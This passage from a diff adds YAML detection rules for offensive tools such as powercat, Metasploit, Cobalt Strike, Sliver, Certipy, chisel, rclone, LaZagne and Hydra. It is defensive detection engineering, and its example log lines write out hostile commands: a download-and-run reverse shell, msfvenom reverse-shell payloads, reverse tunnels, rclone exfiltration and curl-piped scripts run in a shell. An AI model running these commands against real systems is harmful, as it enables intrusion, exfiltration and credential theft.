+    There is no administrative reason to bind cmd or PowerShell to a socket.
+  examples:
+    positive:
+      - 'powershell -c "IEX (iwr http://203.0.113.7/powercat.ps1); powercat -c 203.0.113.7 -p 443 -e cmd"'
+    negative:
+      - 'powershell -c "powercat -l -p 8000 -of C:\Temp\recv.bin"'
+      - 'powershell -c "Get-Help about_Remote"'
+
+- id: mention.tool_metasploit_terms
+  title: Metasploit payload and console terms
+  match:
+    literal: ['meterpreter', 'msfvenom', 'msfconsole', 'exploit/multi/handler', 'shell_reverse_tcp', 'shell/reverse_tcp', 'cmd/unix/reverse']
+  case_sensitive: false
+  strength: strong
+  attack: [T1059, T1071.001, T1095, T1105]
+  telemetry: [any]
+  source:
+    name: Metasploit Framework (Rapid7) module and tool names
+    url: https://github.com/rapid7/metasploit-framework/tree/fa68d9cca90702cb1ae86dbae72d53d0738f7a12
+    license: BSD-3-Clause (framework LICENSE; bundled components vary)
+    upstream_id: modules/exploits/multi/handler.rb
+  rationale: >-
+    The framework's own names: the msfvenom and msfconsole tools, the multi/handler module, Meterpreter, and the
+    shell_reverse_tcp, shell/reverse_tcp and cmd/unix/reverse payload paths (verified in the repository at the pinned
+    commit). They appear in staged payloads, generator output and operator history; the benign source is an
+    authorized test or training range.
+  examples:
+    positive:
+      - 'Nov 20 16:06:00 lnx02 bash[999]: HISTORY: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f elf -o /tmp/u'
+      - 'Nov 21 09:02:20 kali01 bash[4100]: HISTORY: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 203.0.113.7; run"'
+      - 'Nov 21 09:02:21 kali01 bash[4100]: HISTORY: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp"'
+      - 'Nov 21 09:02:22 kali01 bash[4100]: HISTORY: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp"'
+      - 'Nov 21 09:02:23 kali01 bash[4100]: HISTORY: msfvenom -p linux/x86/shell/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f raw'
+      - 'Nov 21 09:02:24 kali01 bash[4100]: HISTORY: msfvenom -p cmd/unix/reverse_bash LHOST=203.0.113.7 LPORT=4444 -f raw'
+    negative:
+      - 'Nov 20 16:06:01 lnx02 bash[1000]: HISTORY: metasploitable-check --help'
+      - 'Nov 20 16:06:02 lnx02 bash[1001]: HISTORY: msfs-config validate'
+
+- id: mention.tool_cobalt_strike_msse_pipe
+  title: Cobalt Strike artifact-kit default pipe (MSSE-<n>-server)
+  match:
+    anchored: '\\MSSE-[0-9]{1,5}-server\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1559]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: CobaltStrike Named Pipe (Florian Roth, Wojciech Lesicki)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
+    license: DRL-1.1
+    upstream_id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
+  rationale: >-
+    Cobalt Strike's default artifact kit stages the beacon through a pipe named MSSE-<number>-server. The rule's
+    other prefixes (status_, mojo_, samr_ and similar) imitate legitimate pipes and are left out as too
+    collision-prone for free text; the postex_ and msagent_ defaults are separate entries.
+  examples:
+    positive:
+      - 'Pipe Created: PipeName: \MSSE-1234-server Image: C:\Windows\System32\rundll32.exe'
+    negative:
+      - 'Pipe Created: PipeName: \MsFteWds Image: C:\Windows\System32\SearchIndexer.exe'
+      - 'Pipe Created: PipeName: \MSSQL$SQLEXPRESS\sql\query Image: C:\Program Files\Microsoft SQL Server\sqlservr.exe'
+
+- id: mention.tool_cobalt_strike_postex_pipe
+  title: Cobalt Strike post-exploitation default pipe (postex_)
+  match:
+    anchored: '\\postex_(?:ssh_)?[0-9a-f]{4}\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1055, T1559]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: CobaltStrike Named Pipe (Florian Roth, Wojciech Lesicki)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
+    license: DRL-1.1
+    upstream_id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
+  rationale: >-
+    Cobalt Strike post-exploitation jobs (mimikatz, screenshot, keylogger, ssh) report back over a pipe named
+    postex_<4 hex>; no Windows component or common product uses the prefix.
+  examples:
+    positive:
+      - 'Pipe Connected: PipeName: \postex_8a3b Image: C:\Windows\SysWOW64\dllhost.exe'
+    negative:
+      - 'Pipe Created: PipeName: \mojo.5544.8812.12345678901234567 Image: C:\Program Files\Google\Chrome\Application\chrome.exe'
+      - 'Pipe Created: PipeName: \PSHost.133012345678901234.4412.DefaultAppDomain.powershell Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+
+- id: mention.tool_cobalt_strike_msagent_pipe
+  title: Cobalt Strike SMB beacon default pipe (msagent_)
+  match:
+    anchored: '\\msagent_[0-9a-f]{2,4}\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1071.002, T1021.002]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: CobaltStrike Named Pipe (Florian Roth, Wojciech Lesicki)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
+    license: DRL-1.1
+    upstream_id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2
+  rationale: >-
+    The default SMB beacon pipe msagent_<hex> carries peer-to-peer beacon traffic between internal hosts; seeing it
+    on several hosts maps the beacon chain.
+  examples:
+    positive:
+      - 'Pipe Created: PipeName: \msagent_4f Image: C:\Windows\System32\spoolsv.exe'
+    negative:
+      - 'Pipe Created: PipeName: \wkssvc Image: C:\Windows\System32\svchost.exe'
+      - 'Pipe Created: PipeName: \msagentupdate_status Image: C:\Program Files\Vendor\agent.exe'
+
+- id: mention.tool_sliver_powershell_pattern
+  title: Sliver implant PowerShell launch pattern
+  match:
+    literal: ['-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8']
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.001, T1071.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Sliver C2 Implant Activity Pattern (Nasreddine Bencherchali, Florian Roth)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_sliver_c2_execution_pattern.yml
+    license: DRL-1.1
+    upstream_id: 42333b2c-b425-441c-b70e-99404a17170f
+  rationale: >-
+    Sliver's implant starts PowerShell with this exact console-encoding prefix for its shell and execute commands;
+    the rule rates false positives as unlikely.
+  examples:
+    positive:
+      - 'powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8'
+    negative:
+      - 'powershell.exe -NoExit -Command Set-Location C:\Projects'
+      - 'powershell.exe -NoProfile -Command [Console]::OutputEncoding'
+
+- id: mention.tool_sliver_service_name
+  title: Sliver default service name
+  match:
+    anchored: 'Service Name: {0,2}Sliver(?: implant)?\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1569.002, T1543.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Sliver C2 Default Service Installation (Florian Roth, Nasreddine Bencherchali)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/builtin/system/service_control_manager/win_system_service_install_sliver.yml
+    license: DRL-1.1
+    upstream_id: 31c51af6-e7aa-4da7-84d4-8f32cc580af2
+  rationale: >-
+    Sliver's psexec-style lateral movement installs a service named 'Sliver' unless the operator overrides it; in
+    service-install text this is the implant being pushed.
+  examples:
+    positive:
+      - 'A service was installed in the system. Service Name: Sliver Service File Name: C:\windows\temp\aBcDeFgHiJ.exe'
+    negative:
+      - 'A service was installed in the system. Service Name: Silverlight Updater Service File Name: C:\Program Files\Microsoft Silverlight\agent.exe'
+      - 'A service was installed in the system. Service Name: CorpAgent Service File Name: C:\Program Files\Corp\agent.exe'
+
+- id: mention.tool_responder_hash_capture
+  title: 'Responder or Inveigh hash output line'
+  match:
+    anchored: '\] NTLMv[12](?:-SSP)? Hash {1,10}: '
+  case_sensitive: true
+  strength: strong
+  attack: [T1557.001, T1040]
+  telemetry: [any]
+  source:
+    name: Responder utils.py (lgandx)
+    url: https://github.com/lgandx/Responder/blob/424fbe53d6a61824e3c7685fe5f69668721b821e/utils.py
+    license: GPL-3.0
+    upstream_id: SaveToDb
+  rationale: >-
+    Responder prints '[<module>] NTLMv2-SSP Hash     : <hash>' for every credential it captures by poisoning
+    LLMNR/NBT-NS/mDNS; the line in any log means hashes are being harvested on the segment.
+  examples:
+    positive:
+      - '[SMB] NTLMv2-SSP Hash     : alice::CORP:1122334455667788:0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D:0101000000000000'
+    negative:
+      - '[*] [LLMNR]  Poisoned answer sent to 10.0.0.15 for name fileserv'
+      - 'Nov 20 16:07:00 dc01 lsass: NTLM authentication succeeded for alice'
+
+- id: mention.tool_bloodhound_collectors
+  title: BloodHound collector options and names
+  match:
+    literal:
+      - ' -CollectionMethod All '
+      - ' --CollectionMethods Session '
+      - ' --Loop --Loopduration '
+      - ' --PortScanTimeout '
+      - 'Invoke-Bloodhound'
+      - 'Get-BloodHoundData'
+      - 'SharpHound'
+  case_sensitive: false
+  strength: strong
+  attack: [T1087.002, T1069.002, T1482]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Bloodhound/Sharphound Execution (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_bloodhound_sharphound.yml
+    license: DRL-1.1
+    upstream_id: f376c8a7-a2d0-4ddc-aa0c-16c17236d962
+  rationale: >-
+    SharpHound collection switches and PowerShell entry points map the whole Active Directory attack graph. Defenders
+    run BloodHound too, which is the benign case; the generic '.exe -c All -d ' keyword is left out.
+  examples:
+    positive:
+      - 'C:\Users\Public\SharpHound.exe -CollectionMethod All --ZipFileName out.zip'
+      - 'C:\Users\Public\SharpHound.exe --CollectionMethods Session --OutputDirectory C:\Temp'
+      - 'C:\Users\Public\SharpHound.exe --Loop --Loopduration --OutputDirectory C:\Temp'
+      - 'C:\Users\Public\SharpHound.exe --PortScanTimeout --OutputDirectory C:\Temp'
+      - 'powershell -c "Import-Module .\SharpHound.ps1; Invoke-Bloodhound -CollectionMethod All -OutputDirectory C:\Temp"'
+      - 'powershell -c "Import-Module .\SharpHound.ps1; Get-BloodHoundData -CollectionMethod All -OutputDirectory C:\Temp"'
+    negative:
+      - 'powershell -c "Get-ADGroupMember -Identity ''Domain Admins''"'
+      - 'C:\Tools\adexplorer.exe -snapshot "" C:\Temp\snap.dat'
+
+- id: mention.tool_seatbelt_checks
+  title: Seatbelt host-survey commands
+  match:
+    literal:
+      - ' DpapiMasterKeys'
+      - ' InterestingProcesses'
+      - ' InterestingFiles'
+      - ' ChromiumPresence'
+      - ' CloudCredentials'
+      - ' CredEnum'
+      - ' CredGuard'
+      - 'Seatbelt.exe'
+  case_sensitive: false
+  strength: strong
+  attack: [T1082, T1555, T1552.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PUA - Seatbelt Execution (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_seatbelt.yml
+    license: DRL-1.1
+    upstream_id: 38646daa-e78f-4ace-9de0-55547b2d30da
+  rationale: >-
+    Seatbelt command names for credential and survey checks (DPAPI master keys, cloud credentials, credential
+    enumeration). The browser-history and generic checks of the rule are left out as words other tools use.
+  examples:
+    positive:
+      - 'execute-assembly Seatbelt.exe -group=user -outputfile=C:\Temp\s.txt'
+      - 'C:\Users\Public\sb.exe CloudCredentials DpapiMasterKeys'
+      - 'execute-assembly Seatbelt.exe InterestingProcesses -outputfile=C:\Temp\s.txt'
+      - 'execute-assembly Seatbelt.exe InterestingFiles -outputfile=C:\Temp\s.txt'
+      - 'execute-assembly Seatbelt.exe ChromiumPresence -outputfile=C:\Temp\s.txt'
+      - 'execute-assembly Seatbelt.exe CredEnum -outputfile=C:\Temp\s.txt'
+      - 'execute-assembly Seatbelt.exe CredGuard -outputfile=C:\Temp\s.txt'
+    negative:
+      - 'C:\Program Files\Corp\agent.exe --report credentials-policy'
+      - 'gpresult /r'
+
+- id: mention.tool_sharpup_checks
+  title: SharpUp privilege-escalation checks
+  match:
+    literal: ['HijackablePaths', 'UnquotedServicePath', 'ModifiableServiceBinaries', 'ModifiableScheduledTask', 'DomainGPPPassword', 'CachedGPPPassword', 'SharpUp.exe']
+  case_sensitive: false
+  strength: strong
+  attack: [T1574.009, T1552.006, T1082]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - SharpUp PrivEsc Tool Execution (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_sharpup.yml
+    license: DRL-1.1
+    upstream_id: c484e533-ee16-4a93-b6ac-f0ea4868b2f1
+  rationale: >-
+    SharpUp's check names for unquoted service paths, writable service binaries and GPP passwords; the rule rates it
+    critical with no listed false positives. 'ProcessDLLHijack' is included in the rule but left out here as a phrase
+    also used in vendor advisories.
+  examples:
+    positive:
+      - 'execute-assembly SharpUp.exe audit UnquotedServicePath ModifiableServiceBinaries'
+      - 'execute-assembly SharpUp.exe audit HijackablePaths'
+      - 'execute-assembly SharpUp.exe audit ModifiableScheduledTask'
+      - 'execute-assembly SharpUp.exe audit DomainGPPPassword'
+      - 'execute-assembly SharpUp.exe audit CachedGPPPassword'
+    negative:
+      - 'sc qc CorpAgent'
+      - 'icacls "C:\Program Files\Corp"'
+
+- id: mention.tool_certify_adcs_abuse
+  title: Certify AD CS abuse command
+  match:
+    anchored: 'Certify\.exe {1,3}(?:find|request|cas|pkiobjects|download)\b[^\n]{0,200}(?:/vulnerable|/template:|/altname:|/ca:)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1649]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Certify Execution (pH-T, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_certify.yml
+    license: DRL-1.1
+    upstream_id: 762f2482-ff21-4970-8939-0aa317a886bb
+  rationale: >-
+    The rule's command and option lists: finding vulnerable certificate templates and requesting certificates with
+    an alternate subject name is how AD CS is abused to impersonate domain admins. Certificate administrators use
+    certutil and the CA console, not Certify.
+  examples:
+    positive:
+      - 'Certify.exe request /ca:ca01.corp.example.org\CORP-CA /template:VulnUser /altname:administrator'
+    negative:
+      - 'certutil -ca.cert C:\Temp\ca.cer'
+      - 'certreq -submit -attrib "CertificateTemplate:WebServer" req.csr'
+
+- id: mention.tool_certipy_adcs_abuse
+  title: Certipy AD CS abuse command
+  match:
+    anchored: 'certipy {1,3}(?:find|req|auth|shadow|template|forge|relay|account|cert|ptt)\b[^\n]{0,200}(?:-vulnerable|-template|-upn |-pfx |-ca |-dc-ip |-target|-bloodhound|-kirbi)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1649]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Certipy Execution (pH-T, Sittikorn Sangrattanapitak)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_certipy.yml
+    license: DRL-1.1
+    upstream_id: 6938366d-8954-4ddc-baff-c830b3ba8fcd
+  rationale: >-
+    The rule's commands with its flags: Certipy enumerates vulnerable templates, requests certificates for other
+    principals, and authenticates with them (PKINIT, shadow credentials). It has no administrative use.
+  examples:
+    positive:
+      - 'Nov 20 16:08:00 lnx02 bash[1002]: HISTORY: certipy req -u bob@corp.example.org -p x -ca CORP-CA -template VulnUser -upn administrator@corp.example.org'
+    negative:
+      - 'Nov 20 16:08:01 lnx02 bash[1003]: HISTORY: openssl x509 -in ca.pem -noout -subject'
+      - 'Nov 20 16:08:02 lnx02 bash[1004]: HISTORY: pip show certifi'
+
+- id: mention.tool_chisel_tunnel
+  title: chisel tunnel client or server with reverse or SOCKS options
+  match:
+    anchored: 'chisel(?:\.exe)? {1,3}(?:client|server) [^\n]{0,200}(?:-socks5|--socks5|-reverse|--reverse| R:|:socks\b)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1572, T1090.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PUA - Chisel Tunneling Tool Execution (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_chisel.yml
+    license: DRL-1.1
+    upstream_id: 8b0e12da-d3c3-49db-bb4f-256703f380e5
+  rationale: >-
+    chisel with reverse port forwards or a SOCKS proxy tunnels traffic out through HTTP, a staple of intrusions.
+    Developers use chisel for port forwarding too, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 16:09:00 web01 bash[1003]: HISTORY: ./chisel client 203.0.113.7:8443 R:socks'
+      - 'C:\Users\Public\chisel.exe client --fingerprint x 203.0.113.7:443 R:3389:127.0.0.1:3389'
+    negative:
+      - 'Nov 20 16:09:01 web01 bash[1004]: HISTORY: chisel --version'
+      - 'Nov 20 16:09:02 web01 bash[1005]: HISTORY: chisel server --port 9000 --authfile users.json'
+
+- id: mention.tool_chisel_protocol
+  title: chisel protocol version string
+  match:
+    literal: ['chisel-v3']
+  case_sensitive: false
+  strength: medium
+  attack: [T1572]
+  telemetry: [any]
+  source:
+    name: chisel share/version.go (jpillora)
+    url: https://github.com/jpillora/chisel/blob/5ee6c74d60d96a75afb18bc866eb19327170aeed/share/version.go
+    license: MIT
+    upstream_id: ProtocolVersion
+  rationale: >-
+    chisel negotiates its WebSocket subprotocol as 'chisel-v3'; a proxy or web log carrying it shows a chisel tunnel
+    through that server. Sanctioned developer use is the benign case.
+  examples:
+    positive:
+      - '10.0.3.30 - - [20/Nov/2026:16:10:00 +0000] "GET / HTTP/1.1" 101 0 "-" "Go-http-client/1.1" sec-websocket-protocol="chisel-v3"'
+    negative:
+      - '10.0.3.30 - - [20/Nov/2026:16:10:01 +0000] "GET /ws HTTP/1.1" 101 0 "-" "Mozilla/5.0" sec-websocket-protocol="graphql-ws"'
+      - 'Nov 20 16:10:02 web01 bash[1006]: HISTORY: chisel --help'
+
+- id: mention.tool_frp_config
+  title: Fast Reverse Proxy client or server configuration file
+  match:
+    literal: ['frpc.ini', 'frps.ini', 'frpc.toml', 'frps.toml']
+  case_sensitive: false
+  strength: medium
+  attack: [T1572, T1090]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PUA - Fast Reverse Proxy (FRP) Execution (frack113, Florian Roth)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_frp.yml
+    license: DRL-1.1
+    upstream_id: 32410e29-5f94-4568-b6a3-d91a8adad863
+  rationale: >-
+    frp exposes internal services through an external server and is widely used by intrusion sets for persistent
+    access; its config file names identify it even when the binary is renamed. Self-hosters use frp legitimately, so
+    it is medium.
+  examples:
+    positive:
+      - 'C:\ProgramData\svchost.exe -c C:\ProgramData\frpc.ini'
+    negative:
+      - 'Nov 20 16:11:00 web01 bash[1007]: HISTORY: cat /etc/frpd.conf'
+      - 'C:\Program Files\Corp\agent.exe -c C:\ProgramData\Corp\agent.ini'
+
+- id: mention.tool_ngrok_exposure
+  title: 'ngrok tcp 445, 3389, 5985 or 22, or ngrok authtoken text'
+  match:
+    anchored: 'ngrok(?:\.exe)? {1,3}(?:tcp {1,3}(?:139|445|3389|5985|5986|22)\b|authtoken |config add-authtoken )'
+  case_sensitive: false
+  strength: medium
+  attack: [T1572, T1219]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PUA - Ngrok Execution (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_ngrok.yml
+    license: DRL-1.1
+    upstream_id: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31
+  rationale: >-
+    Tunnelling RDP, SMB, WinRM or SSH out through ngrok gives an outsider direct access around the perimeter; setting
+    an auth token installs the agent. Developers use ngrok for web demos (the rule notes 'ngrok http'), which this
+    entry does not match.
+  examples:
+    positive:
+      - 'C:\Users\Public\ngrok.exe tcp 3389'
+      - 'Nov 20 16:12:00 web01 bash[1008]: HISTORY: ./ngrok authtoken 2abcDEF_ghiJKL'
+    negative:
+      - 'ngrok http 3978'
+      - 'Nov 20 16:12:01 web01 bash[1009]: HISTORY: ngrok version'
+
+- id: mention.tool_rclone_exfil_options
+  title: rclone copy with an explicit config and no certificate check
+  match:
+    anchored: 'rclone(?:\.exe)? [^\n]{0,150}--config [^\n]{0,150}--no-check-certificate'
+  case_sensitive: false
+  strength: medium
+  attack: [T1567.002, T1048]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PUA - Rclone Execution (Bhabesh Raj, Sittikorn S, Aaron Greetham, NCC Group)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_rclone_execution.yml
+    license: DRL-1.1
+    upstream_id: e37db05d-d1f9-49c8-b464-cee1a4b11638
+  rationale: >-
+    The rule's specific-options selection: rclone pointed at a dropped config file with certificate checks disabled
+    is the ransomware exfiltration pattern. Backup jobs use rclone too, usually with the default config, so it is
+    medium.
+  examples:
+    positive:
+      - 'C:\Users\Public\rclone.exe copy \\fs01\finance mega:loot --config C:\Users\Public\rc.conf --no-check-certificate --transfers 16'
+    negative:
+      - 'Nov 20 16:13:00 bk01 rclone[700]: INFO  : backup.tar.gz: Copied (new) to s3:corp-backups'
+      - 'Nov 20 16:13:01 bk01 bash[1010]: HISTORY: rclone listremotes'
+
+- id: mention.tool_lazagne
+  title: LaZagne credential recovery tool
+  match:
+    literal: ['lazagne', 'The LaZagne Project']
+  case_sensitive: false
+  strength: strong
+  attack: [T1555, T1552.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - LaZagne Execution (Nasreddine Bencherchali, Swachchhanda Shrawan Poudel)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_lazagne.yml
+    license: DRL-1.1
+    upstream_id: c2b86e67-b880-4eec-b045-50bc98ef4844
+  rationale: >-
+    LaZagne recovers stored passwords from browsers, mail, Wi-Fi and system stores on Windows and Linux; its name and
+    banner appear when it is staged or run. It has no administrative use on servers.
+  examples:
+    positive:
+      - 'C:\Users\Public\lazagne.exe all -oN -output C:\Users\Public\'
+      - '|====================================================================| The LaZagne Project'
+    negative:
+      - 'C:\Program Files\KeePass\KeePass.exe C:\Users\alice\db.kdbx'
+      - 'Nov 20 16:14:00 ws01 chrome.exe: password manager sync complete'
+
+- id: mention.tool_peass_enumeration
+  title: PEASS-ng privilege-escalation enumeration scripts
+  match:
+    literal: ['linpeas', 'winpeas', 'PEASS-ng']
+  case_sensitive: false
+  strength: strong
+  attack: [T1082, T1083, T1548]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - winPEAS Execution (Georg Lauenstein)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_winpeas.yml
+    license: DRL-1.1
+    upstream_id: 98b53e78-ebaf-46f8-be06-421aafd176d9
+  rationale: >-
+    linPEAS and winPEAS hunt for privilege-escalation paths; the rule also keys on the PEASS-ng release download URL.
+    Their names appear when the scripts are fetched or run, which outside an authorized test is post-exploitation.
+  examples:
+    positive:
+      - 'Nov 20 16:15:00 web01 bash[1011]: HISTORY: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
+      - 'C:\Users\Public\winPEASx64.exe servicesinfo'
+    negative:
+      - 'Nov 20 16:15:01 web01 bash[1012]: HISTORY: sudo -l'
+      - 'Nov 20 16:15:02 web01 bash[1013]: HISTORY: find / -perm -4000 -type f 2>/dev/null | head'
+
+- id: mention.tool_hydra_form_brute
+  title: Hydra brute force with login and password placeholders
+  match:
+    anchored: '\^USER\^[^\n]{0,200}\^PASS\^'
+  case_sensitive: true
+  strength: medium
+  attack: [T1110.001, T1110.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Hydra Password Bruteforce Execution (Vasiliy Burov)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_hydra.yml
+    license: DRL-1.1
+    upstream_id: aaafa146-074c-11eb-adc1-0242ac120002
+  rationale: >-
+    Hydra's web-form modules mark where the username and password go with ^USER^ and ^PASS^; the rule keys on them.
+    The order user-then-password is the documented form syntax. Authorized password audits are the benign case.
+  examples:
+    positive:
+      - 'Nov 20 16:16:00 lnx02 bash[1014]: HISTORY: hydra -L users.txt -P rockyou.txt 10.0.0.20 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"'
+    negative:
+      - 'Nov 20 16:16:01 lnx02 bash[1015]: HISTORY: curl -d "user=alice&pass=secret" https://intranet.example.org/login'
+      - 'Nov 20 16:16:02 lnx02 bash[1016]: HISTORY: echo ^C pressed'
+
+- id: mention.tool_hydra_banner
+  title: THC Hydra banner
+  match:
+    literal: ['van Hauser/THC']
+  case_sensitive: false
+  strength: medium
+  attack: [T1110]
+  telemetry: [any]
+  source:
+    name: THC Hydra hydra.c (vanhauser-thc)
+    url: https://github.com/vanhauser-thc/thc-hydra/blob/707c822e88938c526279fcabc10a8a265bbc53c4/hydra.c
+    license: AGPL-3.0
+    upstream_id: AUTHOR
+  rationale: >-
+    Hydra prints its author string in the startup banner; captured output with it shows an online password attack
+    was started. Authorized audits are the benign case.
+  examples:
+    positive:
+      - 'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations'
+    negative:
+      - 'Nov 20 16:17:00 lnx02 sshd[1017]: Failed password for invalid user admin from 203.0.113.9 port 4022 ssh2'
+      - 'Nov 20 16:17:01 lnx02 fail2ban.actions[700]: NOTICE [sshd] Ban 203.0.113.9'
+
+- id: mention.tool_attack_tool_user_agents
+  title: 'Attack and scanner tool user agents'
+  match:
+    literal:
+      - '(hydra)'
+      - ' arachni/'
+      - ' BFAC '
+      - ' brutus '
+      - ' cgichk '
+      - 'core-project/1.0'
+      - ' crimscanner/'
+      - 'datacha0s'
+      - 'dirbuster'
+      - 'domino hunter'
+      - 'dotdotpwn'
+      - 'FHScan Core'
+      - 'gootkit auto-rooter scanner'
+      - 'grendel-scan'
+      - ' inspath '
+      - 'internet ninja'
+      - 'jaascois'
+      - ' zmeu '
+      - 'masscan'
+      - 'morfeus fucking scanner'
+      - 'n-stealth'
+      - 'nsauditor'
+      - 'pmafind'
+      - 'springenwerk'
+      - 'teh forest lobster'
+      - 'toata dragostea'
+      - ' vega/'
+      - 'voideye'
+      - 'webshag'
+      - 'webvulnscan'
+      - ' whcc/'
+      - ' Havij'
+      - 'bsqlbf'
+      - 'mysqloit'
+      - 'sql power injector'
+      - 'sqlmap'
+      - 'sqlninja'
+      - 'uil2pn'
+      - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1595.002, T1190, T1110]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Hack Tool User Agent (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/proxy_generic/proxy_ua_hacktool.yml
+    license: DRL-1.1
+    upstream_id: c42a3073-30fb-48ae-8c99-c23ada84b103
+  rationale: >-
+    Default user agents of brute-forcers, SQL injection tools and web scanners, from the rule's list. Internet-facing
+    servers see some of them as background scanning and authorized scanners use them internally, so they are medium;
+    source address and response codes decide. Generic words in the rule ('ruler', 'security scan', 'floodgate',
+    'pangolin', 'absinthe', ' metis ', 'get-minimal') are left out.
+  examples:
+    positive:
+      - '203.0.113.61 - - [20/Nov/2026:16:18:00 +0000] "GET /item.php?id=1%27 HTTP/1.1" 500 0 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:18:01 +0000] "GET / HTTP/1.1" 200 812 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"'
+      - '10.0.3.9 - - [20/Nov/2026:16:18:02 +0000] "GET /health HTTP/1.1" 200 2 "-" "kube-probe/1.29"'
+
+- id: mention.tool_recon_tool_user_agents
+  title: Web reconnaissance tool user agents
+  match:
+    literal:
+      - 'commix/'
+      - 'feroxbuster/'
+      - 'Fuzz Faster U Fool'
+      - 'GIS - AppSec Team - Project Vision'
